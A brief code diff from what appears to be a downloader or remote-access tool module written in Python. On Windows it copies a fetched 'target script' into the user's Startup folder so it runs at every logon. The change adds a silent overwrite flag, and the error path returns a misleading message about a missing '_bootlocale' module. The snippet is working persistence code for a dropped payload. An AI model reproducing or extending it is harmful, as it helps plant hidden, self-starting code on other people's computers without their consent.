@@ -74,7 +74,7 @@ def run(**args):
         mon_fichier.close()
         if os.name == 'nt' and winRunOnBoot == True:
             startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-            os.system("copy \"%s\" \"%s\""%(targetPath, startPath))
+            os.system("copy /Y \"%s\" \"%s\""%(targetPath, startPath))
     except:
         print("[Error] getFileFromURI: could not create Targetscript")
         return " modules/_bootlocale not found!!"
